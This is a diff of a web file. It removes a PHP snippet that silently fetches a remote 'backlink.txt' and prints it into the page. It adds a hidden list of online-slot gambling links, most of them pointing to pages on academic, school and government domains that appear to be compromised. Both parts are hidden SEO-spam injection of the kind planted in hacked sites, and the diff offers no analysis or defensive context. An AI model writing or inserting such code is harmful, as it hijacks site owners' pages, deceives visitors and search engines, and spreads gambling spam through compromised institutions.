@@ -1,9 +1,14 @@
-<?php
-error_reporting(0);
-set_time_limit(0);
-$q = curl_init();
-curl_setopt($q, CURLOPT_URL, "https://domain.com/backlink.txt");
-curl_setopt($q, CURLOPT_RETURNTRANSFER, 1);
-$z = curl_exec($q);
-curl_close($q);
-echo($z);
+<div style="display:none;"><ul>
+<li><a href="https://siakad.sttkatharos.ac.id/sdemo/">Slot Gacor</a></li>
+<li><a href="https://sman8jkt.sch.id/mutasi2021/">Slot Online</a></li>
+<li><a href="https://perpustakaan.kemendagri.go.id/opac/help/">Slot Terbaru</a></li>
+<li><a href="https://pic.poltekkes-pontianak.ac.id/sgacor/">Awslot777</a></li>
+<li><a href="https://admisi.sttrealbatam.ac.id/smahjong/">Slot Mahjong</a></li>
+<li><a href="https://gacor.pn-sidoarjo.go.id">slot gacor</a></li>
+<li><a href="https://www.poltekkeskupang.ac.id/document/">situs slot gacor</a></li>
+<li><a href="https://pusatpaki.id/">https://pusatpaki.id/</a></li>
+<li><a href="https://www.smanegeri1peukanbada.sch.id/doc/">slot gacor</a></li>
+<li><a href="https://freedompreppers.com/">Poa88</a></li>
+
+
+</ul></div>
